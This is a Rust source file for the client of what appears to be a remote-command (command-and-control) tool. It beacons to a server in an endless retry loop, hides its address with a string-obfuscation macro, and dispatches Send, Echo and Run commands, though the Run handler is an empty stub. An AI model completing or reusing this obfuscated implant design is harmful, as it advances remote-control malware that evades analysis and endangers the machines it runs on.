use std::io::{BufReader, BufWriter};
use std::net::{TcpStream};
use lib::{send_data, receive_data, Command};
use goldberg::goldberg_string;


struct Client {
    reader: BufReader<TcpStream>,
    writer: BufWriter<TcpStream>,
}

// The client will have several actions defined in the lib::Command enum.
// Each command will correspond to a function to run on the client defined in this impl block.
impl Client {
    fn new(stream: TcpStream) -> Client {
        let reader = BufReader::new(stream.try_clone().unwrap());
        let writer = BufWriter::new(stream.try_clone().unwrap());

        Client { reader, writer, }
    }

    fn handle_client(&mut self) {
        loop {
            match receive_data(&mut self.reader) {
                Some((Command::Send, buf)) => self.receive(String::from_utf8_lossy(&buf).to_string()),
                Some((Command::Echo, buf)) => self.echo(&buf),
                Some((Command::Run, buf)) => self.run(String::from_utf8_lossy(&buf).to_string()),
                None => return,
            }
        }
    }
    fn receive(&self, message: String) {
        log::info!("Data received from server: {}", message);
    }
    fn run(&mut self, command: String) {
        // TODO: implement OS-specific run shit here
    }
    fn echo(&mut self, buf: &[u8]) {
        log::debug!("Received bytes: {:?}. As string: \"{}\"", buf, String::from_utf8_lossy(buf));
        if send_data(Command::Send as u8, buf, &mut self.writer).is_ok() {
            log::info!("Successfully echoed data back to server");
        }
        else {
            log::error!("An error occurred while echoing data to server");
        }
    }

}





fn main() {
    pretty_env_logger::init();

    let stream = loop {
        match TcpStream::connect(goldberg_string!("127.0.0.1:4000")) {
            Ok(stream) => {
                log::debug!("Connected to stream");
                break stream;
            },
            Err(_) => {
                log::error!("Could not connect to stream");
                continue;
            }
        };
    };

    let mut client = Client::new(stream);

    loop {
        client.handle_client();
    }
}
